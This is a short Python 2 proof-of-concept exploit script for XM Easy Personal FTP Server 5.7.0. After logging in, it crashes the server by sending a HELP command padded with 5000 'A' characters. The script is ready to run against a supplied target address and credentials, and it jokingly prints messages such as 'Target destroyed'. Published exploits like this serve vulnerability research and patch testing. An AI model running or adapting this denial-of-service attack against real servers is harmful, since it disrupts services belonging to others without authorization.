#!/usr/bin/python
#
# ::::::::::::::::::::::::::::::[neeraj(.)thakar(at)nevisnetworks(.)com]
#
# [-] What:....[ XM Easy Personal FTP Server 5.7.0 ].....
# [-] Where:...[ http://www.dxm2008.com ]................
# [-] When:....[ 14-May-2009 ]...........................
# [-] Who:.....[ NeerajT | neeraj(.)thakar(at)nevisnetworks(.)com ]....
# [-] How:.....[
# A Denial of service vulnerability exists in XM
# Personal FTP Server that causes the application to
# crash when a long list of arguments is sent to
# certain FTP commands post authentication..........]
# [-] Thankz:..[ Jambalaya, Xin and Chintan ]............

import os
import sys
import time
from ftplib import FTP

def usage():
        print "[...XM Personal FTP Server 5.7.0 DoS Exploit...]"
        print "[.........neeraj(.)thakar(at)gmail(.)com..............]\n"
        print "Usage: ./XMPersonal_FTPServer_DoSPoC.py <server-ip> <username> <password>\n"
        print "\n Use it at your own risk ! This is just a PoC. I am not responsible for damages done by your crazy thinking.. :P\n"

# The Main function starts here..
if __name__ == "__main__":
        ftpport = '21'

        # get the args..
        if len(sys.argv) < 3:
                usage()
                sys.exit(1)
        ftpserver = sys.argv[1]
        user = sys.argv[2]
        passwd = sys.argv[3]

        print "Connecting to "+ftpserver+" using "+user+"....",

        # Try opening a connection to the FTP server
        try:
                F = FTP(ftpserver)
                F.timeout = 3
                if F:
                        print 'Connected !'
        except:
                print "\nCould not connect to the Server :(\n"
                sys.exit(1)

        #Lets create the Buffer..
        crap = "A" * 5000

        # Creat'in da'bomb
        dabomb = 'HELP '+crap

        print "Press any key to login.."
        ch = sys.stdin.read(1)

        # Lets login
        try:
                F.login(user, passwd)
        except:
                print "Oops.. Looks like you forgot to create a login !!\n"
                F.quit()
                sys.exit(1)
        print "Target Locked, Press any key to fire..",
        ch = sys.stdin.read(1)

        print 'Sendin Da\'Bomb..'
        try:
                F.sendcmd(dabomb)
        except:
                print 'Target destroyed !! Mission successfull..!'

        print 'Returning to base..'
        F.close()
        sys.exit(0)
